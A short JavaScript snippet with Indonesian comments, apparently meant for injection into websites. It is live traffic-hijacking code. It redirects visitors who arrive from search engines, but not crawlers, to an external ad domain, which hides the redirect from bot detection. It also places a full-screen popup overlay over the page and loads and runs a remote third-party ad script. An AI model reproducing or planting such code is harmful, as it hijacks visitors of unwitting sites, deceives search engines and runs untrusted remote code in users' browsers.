(function() {
    // 1. Langsung injeksi Meta Upgrade agar resource iklan TIDAK diblokir Chrome
    var m = document.createElement('meta');
    m.httpEquiv = "Content-Security-Policy";
    m.content = "upgrade-insecure-requests";
    document.head.appendChild(m);

    // 2. Redirect Traffic (Hanya Non-Bot dari Search Engine)
    var ref = document.referrer.toLowerCase();
    var se = ["google.","bing.","yahoo.","baidu.","yandex.","duckduckgo."];
    if (ref && !/bot|spider|crawler/i.test(navigator.userAgent)) {
        if (se.some(function(x){ return ref.indexOf(x) !== -1 })) {
            window.location.replace("https://anguishgrandpa.com/scg1652n5?key=012f54500c0d91c4f78b75f72cb909d3");
            return;
        }
    }

    // 3. Popup Ads (Gunakan link HTTPS Permanen)
    var style = document.createElement('style');
    style.innerHTML = '#popup-overlay-ads{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center}.popup-box-ads{width:300px;height:250px;background:#fff;position:relative}.close-ad-x{position:absolute;top:-30px;right:0;background:#f00;color:#fff;padding:5px;cursor:pointer;font-family:sans-serif;font-size:12px}';
    document.head.appendChild(style);

    var div = document.createElement('div');
    div.id = 'popup-overlay-ads';
    div.innerHTML = '<div class="popup-box-ads"><div class="close-ad-x" onclick="this.parentElement.parentElement.remove()">CLOSE [X]</div><div id="ad-container"></div></div>';
    document.body.appendChild(div);

    window.atOptions = { 'key' : 'c6519a79b77606d968cf36c00f3894c6', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };
    var s = document.createElement('script');
    s.src = "https://www.highperformanceformat.com/c6519a79b77606d968cf36c00f3894c6/invoke.js";
    document.getElementById('ad-container').appendChild(s);
})();
